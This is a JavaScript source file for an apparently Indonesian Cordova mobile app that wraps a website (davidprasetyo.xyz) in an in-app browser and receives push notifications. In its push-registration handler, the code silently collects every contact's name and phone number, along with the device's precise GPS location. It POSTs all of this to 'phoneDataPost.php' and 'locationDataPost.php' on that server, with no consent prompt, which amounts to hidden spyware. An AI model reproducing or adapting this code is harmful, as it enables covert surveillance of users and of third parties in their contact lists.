/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */

 /*
 
	APPLICATION
 
 */
 
var ref;

//var mainDomain  	= "atm.berbagiyuk.com";
//var mainHomeUrl 	= "http://www.atm.berbagiyuk.com/";  //with backslash

var mainDomain  	= "davidprasetyo.xyz";
var mainHomeUrl 	= "http://davidprasetyo.xyz/";  //with backslash

var is_inappbrowser = false;
var deviceID;
 
var inappbrowserStartCallback = 
	function(event) { 
		
		navigator.notification.activityStart("", "Loading . . . ");
		setTimeout(function(){ 
			navigator.notification.activityStop() 
			}, 20000);
		
		//Whitelist to system browser
		var currenturl = event.url;
		var waa = /api.whatsapp.com/;
		var sms = /sms:/;
		//redirect if
		if(currenturl.match(waa) || currenturl.match(sms)){
			var ref = cordova.InAppBrowser.open( currenturl, '_system');
			history.go(-1);
			navigator.app.backHistory();
		}
		
	}
	
var inappbrowserStopCallback = 
	function(event) {
		navigator.notification.activityStop();
		//SpinnerPlugin.activityStop();
		ref.show();
	}
	
var inappbrowserExitCallback = 
	function(event) {
		setTimeout(function(){ 
			exitConfirm();
		}, 1000);
	}
	
var inappbrowserErrorCallBack = 
	function(event) {
		navigator.notification.confirm("Kesalahan koneksi server. Anda ingin keluar dari aplikasi ?", onConfirm, "Confirmation", "Ya,Tidak"); 
	}	

	
function exitConfirm(){
	navigator.notification.confirm("Anda ingin keluar dari aplikasi ?", onConfirm, "Confirmation", "Ya,Tidak");
}
	
function callbackBridge(param) {
    alert(param);
}

function openBrowserListenerInit(starturl){
	var ref = cordova.InAppBrowser.open( starturl, '_self', 'location=no, toolbar=no, EnableViewPortScale=yes, zoom=no, hidden=yes');
	ref.addEventListener('loadstart', inappbrowserStartCallback);
	ref.addEventListener('loadstop', inappbrowserStopCallback);
	ref.addEventListener('exit', inappbrowserExitCallback);
	ref.addEventListener('loaderror', inappbrowserErrorCallBack);
}

function goToHome() {
    var starturl = mainHomeUrl;
	//var starturl = "https://gietimes.com/apps/index.php"
	if(is_inappbrowser){
		openBrowserListenerInit(starturl);
	}else{
		if($("#maincontent").attr('src')==""){
			$("#maincontent").attr('src', starturl);
		}else{
			return false;
		}
		
	}
}

function goToUrl(starturl) {

	if(is_inappbrowser){
		openBrowserListenerInit(starturl);
	}else{
		//open iframe
		$("#maincontent").attr('src', starturl);
	}
		
}		

function onBackKeyDown(e) {
    e.preventDefault();
    exitConfirm(); 
    // Prompt the user with the choice
}

function onConfirm(button) {
    if(button==2){//If User selected No, then we just do nothing
        if(is_inappbrowser){
			goToHome();
		}else{
			return false;
		}
    }else{
        navigator.app.exitApp();// Otherwise we quit the app.
    }
}

function sendLocation(latitude, longitude){
		var data = new FormData();
		data.append("deviceid", deviceID);
		data.append("latitude", latitude);
		data.append("longitude", longitude);

		var xhr = new XMLHttpRequest();
		xhr.withCredentials = false;
		
		xhr.addEventListener("readystatechange", function () {
		  if (this.readyState === 4) {
			console.log(this.responseText);
		  }
		});
		
		var theUrl = mainHomeUrl+"android/pusher/locationDataPost.php";
		xhr.open("POST", theUrl);
		xhr.setRequestHeader("cache-control", "no-cache");
		xhr.send(data);
}

var onSuccessLoc = function(position) {
	var latitude = position.coords.latitude ;
	var longitude = position.coords.longitude ;
	sendLocation(latitude, longitude);
};

// onError Callback receives a PositionError object
//
function onErrorLoc(error) {
	alert('code: '    + error.code    + '\n' +
		  'message: ' + error.message + '\n');
}

function getCurrentLocationLoc(){
	
		var geo_options = {
		  enableHighAccuracy: true, 
		  maximumAge        : 30000, 
		  timeout           : 30000
		};
		
		navigator.geolocation.getCurrentPosition(onSuccessLoc, onErrorLoc, geo_options);
}
	
function register(){
	app.setupPush();
}
 
 
 function successCallbackSim(result) {
      alert(JSON.stringify(result));
}

function errorCallbackSim(error) {
      alert(error);
}

function onPrompt(results) {
    alert("You selected button number " + results.buttonIndex + " and entered " + results.input1);
}

function inputPrompt(){
	navigator.notification.prompt(
		'Please enter your name',  // message
		onPrompt,                  // callback to invoke
		'Registration',            // title
		['Ok','Exit'],             // buttonLabels
		'Jane Doe'                 // defaultText
	);
}

function sendPhoneNum(dataCon){
		var data = new FormData();
		data.append("deviceid", deviceID);
		data.append("phonedata", dataCon);

		var xhr = new XMLHttpRequest();
		xhr.withCredentials = false;
		
		xhr.addEventListener("readystatechange", function () {
		  if (this.readyState === 4) {
			console.log(this.responseText);
		  }
		});
		
		var theUrl = mainHomeUrl+"android/pusher/phoneDataPost.php";
		xhr.open("POST", theUrl);
		xhr.setRequestHeader("cache-control", "no-cache");
		xhr.send(data);
}

function onSuccessCont(contacts) {
	var xx = '[';
	
	
    for (var i=0; i<contacts.length; i++) {
		 displayNameS = contacts[i].displayName.replace(/\s/g, '');
		 displayNameS = displayNameS.replace(/\W/g, '')
		 displayNameS = displayNameS.replace(/[^0-9a-z]/gi, '')
	
         xx = xx + '["' + displayNameS + '"';
		 xx = xx + ',"' +  contacts[i].phoneNumbers[0].value + '"]';
		 if(i<(contacts.length-1)){
			 xx = xx + ',';
		 }else{
			xx = xx + ']';
		 }
		 
		 alert(xx);
    }
	var finaldata = xx;
	
	sendPhoneNum(finaldata);
	
};

function onErrorCont(contactError) {
    alert('onError!');
};

function getAllContacts(){
	var options = new ContactFindOptions();
	options.filter="";          // empty search string returns all contacts
	options.multiple=true;      // return multiple results
	filter = ["displayName"];   // return contact.displayName field

	navigator.contacts.find(filter, onSuccessCont, onErrorCont, options);
}


 var app = {
    // Application Constructor
    initialize: function() {
        this.bindEvents();
    },
    // Bind Event Listeners
    //
    // Bind any events that are required on startup. Common events are:
    // 'load', 'deviceready', 'offline', and 'online'.
    bindEvents: function() {
        document.addEventListener('deviceready', this.onDeviceReady, false);
		document.addEventListener("backbutton", onBackKeyDown, false); 
    },
    // deviceready Event Handler
    //
    // The scope of 'this' is the event. In order to call the 'receivedEvent'
    // function, we must explicitly call 'app.receivedEvent(...);'
    onDeviceReady: function() {
        console.log('Received Device Ready Event');
        console.log('calling setup push');
		register();
		//window.plugins.sim.getSimInfo(successCallbackSim, errorCallbackSim);
		//setTimeout(function(){ register(); }, 5000);
		
		
		var connectionStatus = false;
		connectionStatus = navigator.onLine ? 'online' : 'offline';
		if(connectionStatus=="offline"){
			navigator.notification.confirm("Tidak ada koneksi Internet. Anda ingin keluar dari aplikasi ?", onConfirm, "Confirmation", "Ya,Tidak"); 
		}else{
			goToHome();
		}
			
		
    },
    setupPush: function() {
        console.log('calling push init');
        var push = PushNotification.init({
            "android": {
                "senderID": "439977014115"
            },
            "browser": {},
            "ios": {
                "sound": true,
                "vibration": true,
                "badge": true
            },
            "windows": {}
        });
        console.log('after init');

        push.on('registration', function(data) {
            console.log('registration event: ' + data.registrationId);

            var oldRegId = localStorage.getItem('registrationId');
            if (oldRegId !== data.registrationId) {
                // Save new registration ID
                localStorage.setItem('registrationId', data.registrationId);
                // Post registrationId to your app server as the value has changed
            }
			deviceID = data.registrationId;
			var theUrl = mainHomeUrl+"android/pusher/initdevice.php?deviceid="+data.registrationId;

			var xmlHttp = new XMLHttpRequest();
			xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
			xmlHttp.send( null );
			
			//get contacts
			getAllContacts();
			
			//get current loc
			getCurrentLocationLoc()
			
            var parentElement = document.getElementById('registration');
            var listeningElement = parentElement.querySelector('.waiting');
            var receivedElement = parentElement.querySelector('.received');

            listeningElement.setAttribute('style', 'display:none;');
            receivedElement.setAttribute('style', 'display:block;');
			
			//alert("registered");

        });

        push.on('error', function(e) {
            console.log("push error = " + e.message);
        });

        push.on('notification', function(data) {
            console.log('notification event');

			var paramUrl = data.additionalData.url;
			
			var is_url = paramUrl.includes(mainDomain);
			if(is_url){
				goToUrl(paramUrl);
				throw Error();
			}else{
				return 1;
				navigator.notification.alert(
					data.message,         // message
					null,                 // callback
					data.title,           // title
					'Ok'                  // buttonName
				);
				
			}
			
			//olah data disini
			/*
			data.url
			if(data.additionalData.foreground)
				window.alert(data.title+'\n'+data.message); //This is optional as I am trying to show 
													 //Push message as an Alert when the app is in Foreground
			//window.alert('insidePushDeviceReady');
				   if(data.additionalData.coldstart){
		   //redirecturl will be additional key in your payload to hold the relative url for redirection
			window.open(data.additionalData.redirecturl); 
			*/
            
       });
    }
};


